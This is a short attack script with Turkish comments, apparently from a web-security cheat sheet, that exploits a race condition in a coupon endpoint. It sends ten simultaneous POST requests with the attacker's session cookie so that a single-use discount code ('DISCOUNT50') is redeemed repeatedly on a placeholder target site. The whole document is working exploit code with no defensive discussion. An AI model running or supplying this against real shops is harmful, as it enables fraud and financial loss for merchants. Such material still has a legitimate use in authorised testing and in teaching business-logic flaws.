# Kupon kodu sınırsız kullanım:
# Normal: bir kupon bir kez kullanılabilir
# Hata: race condition → aynı anda 2 istek gönder

python3 << 'EOF'
import requests, threading

cookies = {'session': 'SENIN_SESSION'}
url = 'https://hedef.com/apply-coupon'
data = {'code': 'DISCOUNT50'}

def apply_coupon():
    r = requests.post(url, data=data, cookies=cookies)
    print(r.json())

# Aynı anda 10 istek gönder:
threads = [threading.Thread(target=apply_coupon) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
EOF
